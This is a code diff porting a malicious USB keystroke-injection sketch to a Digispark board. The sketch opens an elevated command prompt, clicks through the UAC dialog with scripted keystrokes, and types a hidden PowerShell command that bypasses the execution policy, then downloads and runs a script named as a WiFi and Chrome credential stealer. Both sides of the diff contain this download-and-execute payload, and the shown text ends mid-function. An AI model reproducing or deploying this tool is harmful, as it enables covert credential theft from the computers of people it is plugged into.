@@ -1,43 +1,40 @@
-#include "Keyboard.h"
+#include <DigiKeyboard.h>
+
+#include "DigiKeyboard.h"
 
 void typeKeyFast(int key){
-    Keyboard.press(key);
+    DigiKeyboard.sendKeyPress(key);
     delay(10);
-    Keyboard.release(key);
 }
 
 void startCMD(){
     delay(450);
-    Keyboard.begin();
-    Keyboard.press(KEY_LEFT_CTRL);
+    DigiKeyboard.sendKeyPress(MOD_CONTROL_LEFT);
     delay(100);
-    Keyboard.press(KEY_ESC);
+    DigiKeyboard.sendKeyPress(41);
     delay(100);
-    Keyboard.releaseAll();
-    delay(300);
-    Keyboard.println("cmd");
-    Keyboard.press(KEY_LEFT_CTRL);
+    DigiKeyboard.println("cmd");
+    DigiKeyboard.sendKeyPress(MOD_CONTROL_LEFT);
     delay(140);
-    Keyboard.press(KEY_LEFT_SHIFT);
+    DigiKeyboard.sendKeyPress(MOD_SHIFT_LEFT);
     delay(140);
-    typeKeyFast(KEY_RETURN);
-    Keyboard.releaseAll();
+    typeKeyFast(40);
     delay(1500);
 }
 
 void bypassUAC(){
-    typeKeyFast(KEY_TAB);
-    typeKeyFast(KEY_TAB);
+    typeKeyFast(43);
+    typeKeyFast(43);
     for (int i = 0; i < 70; i++){
-        typeKeyFast(KEY_BACKSPACE);
+        typeKeyFast(42);
     }
-    typeKeyFast(KEY_RETURN);
+    typeKeyFast(40);
     delay(500);
 }
 
 void printCommand(){
-    Keyboard.println("PowerShell.exe -windowstyle hidden Set-ExecutionPolicy Bypass -Force (new-object System.Net.WebClient).DownloadFile('https://github.com/justwibi/Wifi-and-Chrome-DigiSparkStealer-.git', 'b.ps1'); Set-ExecutionPolicy Unrestricted; .\\b.ps1");
-    typeKeyFast(KEY_RETURN);
+    DigiKeyboard.println("PowerShell.exe -windowstyle hidden Set-ExecutionPolicy Bypass -Force (new-object System.Net.WebClient).DownloadFile('https://github.com/justwibi/Wifi-and-Chrome-DigiSparkStealer-.git', 'b.ps1'); Set-ExecutionPolicy Unrestricted; .\\b.ps1");
+    typeKeyFast(40);
 }
 
 void run(){
